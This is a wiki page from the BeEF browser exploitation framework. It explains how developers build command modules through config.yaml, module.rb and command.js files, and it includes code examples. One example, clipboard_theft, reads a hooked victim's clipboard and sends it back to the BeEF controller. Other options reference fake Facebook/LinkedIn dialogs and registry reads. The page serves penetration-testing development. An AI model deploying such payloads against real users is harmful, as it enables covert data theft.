## Introduction

BeEF has been designed in a modular way, it is so very easy to create a new module and add it to BeEF.

Basically, modules are all stored in the [module](https://github.com/beefproject/beef/tree/master/modules) directory and are composed of three main files :
* **config.yaml** : The YAML configuration file which describe properties of the module
* **module.rb**  which allow integrating the module in the BeEF web interface
* **command.js** : the JavaScript "payload" which will be executed on the hooked browser

## <a name="config"/>YAML Configuration file 

The YAML configuration file embeds five informations :
* The name of the plugin
* The name of the author
* The description of the plugin
* The category of the plugin
* The browsers and OS that can be targeted or not

For example, here is the config.yaml of the [detect_firebug](https://github.com/beefproject/beef/blob/master/modules/browser/detect_firebug/config.yaml) plugin:
```yaml
beef:
    module:
        detect_firebug:
            enable: true
            category: "Browser"
            name: "Detect FireBug"
            description: "This module checks if the Mozilla Firefox Firebug extension is being use to inspect the current window."
            authors: ["bcoles"]
            target:
                 working: ["FF"]
                 not_working: ["All"]
```

Regarding list of browser, three arrays can be defined : **working**, **not_working** or **user_notify**. Browsers are defined by their main letters : **"FF"**, **"O"**, **"C"**, **"S"**, **"IE"** or **"All"**.

It is possible to define versions exploitable by providing the minimum and maximum version of each browser. The [get_visited_url](https://github.com/beefproject/beef/blob/master/modules/browser/get_visited_urls/config.yaml) plugin is a good example :
```yaml
target:
    working:
        IE:
            min_ver: 6
            max_ver: 7
        FF:
            min_ver: 3
            max_ver: 3
        C:
            min_ver: 1
            max_ver: 5
        S:
            min_ver: 3
            max_ver: 3
        O:
            min_ver: 1
            max_ver: 10
    not_working: ["All"]
```

You can find more detailed information on [[this page|Command-Module-Config]].

## <a name="modulerb"/>Interface with rails web GUI

Next, you need to write the _module.rb_ file which will allow to be included in the BeEF interface. Don't Panic, you won't need to be a rails guru to write such file, BeEF defined high level methods and objects to do this.

### Basic architecture

Basically, your file will look like this :
```ruby
class Your_module < BeEF::Core::Command

    # This method allows defining the options proposed to the user in the interface
    def self.options
    end

    # This method will be called before sending the payload
    def pre_send
    end

    # This method will be called when BeEF will receive an answer from the hooked browser
    def post_execute
    end
end
```

### Defining data types

The **self.options** method should return an array which defines data proposed to the user. Here is an example with different fields taken from existing modules :

```ruby
  def self.options
    return [{
      'name'=>'key_paths', 
      'ui_label' => 'Key(s)',
      'description' => 'Enter registry keys. Note: each key requires its own line', 
      'type'=>'textarea', 
      'width' => '500px', 
      'height' => '350px', 
      'value'=>'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation\\SystemProductNam'
    },
    {
      'name' => 'iFrameSandbox',
      'ui_label' => 'Sandbox', 
      'type' => 'checkbox',
      'checked' => 'checked' 
    },
    {
      'name' => 'choice', 
      'type' => 'combobox',
      'ui_label' => 'Dialog Type',
      'store_type' => 'arraystore', 
      'store_fields' => ['choice'], 
      'store_data' => [['Facebook'],['LinkedIn'],['Generic']], 
      'valueField' => 'choice', 
      'value' => 'Facebook', 
      editable: false, 
      'displayField' => 'choice', 
      'mode' => 'local', 
      'autoWidth' => true 
    }]
  end
```

More detailed information on data types can be found [[here|Form-Data-Types]]

### Save returned information

It is possible to save information gathered by the script in the list of information on the hooked browser. This action should be done in the **post_execute** function, for example here is the source code of the [browser_fingerprint](https://github.com/beefproject/beef/blob/master/modules/browser/browser_fingerprinting/module.rb) plugin :

```ruby
  def post_execute
    content = {}
    content['browser_type'] = @datastore['browser_type'] if not @datastore['browser_type'].nil?
    content['browser_version'] = @datastore['browser_version'] if not @datastore['browser_version'].nil?
    if content.empty?
      content['fail'] = 'Failed to fingerprint browser.'
    end
    save content
  end
```

* **@datastore** is a dictionary of information returned by the JavaScript payload
* The function define a dictionary and save it with the **save** function.

## <a name="javascriptpayload"/>Javascript payload

The last mandatory file is the JavaScript payload **command.js**. The JavaScript payload should be included in a function called by **beef.execute**. Except that you can do anything you want here.

The following command should be used to return information to the BeEF controller :
```erb
beef.net.send("<%= @command_url %>", <%= @command_id %>, "data");
```

The BeEF JavaScript API already includes a lot of interesting features and embed jQuery. You can see details on this API [[here|Javascript-API]]. If you think that some functions of your module may improve the global API, look the [[relevant section|Javascript-API#wiki-improve]].

Here is an interesting example taken from [clipboard_theft](https://github.com/beefproject/beef/blob/master/modules/host/clipboard_theft/command.js) :

```Javascript
beef.execute(function() {
  if (clipboardData.getData("Text") !== null) {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard="+clipboardData.getData("Text"));
  } else {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard=clipboardData.getData is null or not supported.");
  }
});
```

## Other useful examples

### Bind an external object to a given URI

You can bind an external object to a defined URI in order to use it from the hooked browser :

```ruby
class Your_module < BeEF::Core::Command
    def pre_send
        BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/path/to/file','/uri','extension')
    end

    def post_execute
        BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/uri.extension')
    end 
end
```

### Bind a raw HTTP response to a given URI

You can bind a raw HTTP response (headers and body) to a given URI in order to use it from the hooked browser :

```ruby
  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_raw('200', {'Content-Type'=>'text/html'}, 'hello world!', '/hello_world', -1)
  end
```

### Use BeEF configuration information

You can use information of the BeEF configuration in your module.rb :

```ruby
class Your_module < BeEF::Core::Command
    def self.options
        configuration = BeEF::Core::Configuration.instance
        hook_uri = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/report.html"
        return [
            {'name' => 'url', 'ui_label'=>'URL', 'type' => 'text', 'width' => '400px', 'value' => hook_uri },
        ]
    end 
end
````

## What now ?

If you think that your module can be useful to other people, join the BeEF community on GitHub, fork the beef repository, upload your module and create a new issue for proposing it. We like people with new ideas :).

## References

* [[Reference Page on config.yaml file|Command-Module-Config]]
* [[Reference Page on format type for module.rb file|Form-Data-Types]]

***

[[Previous|BeEF-Console]] | [[Next|WebRTC-Extension]]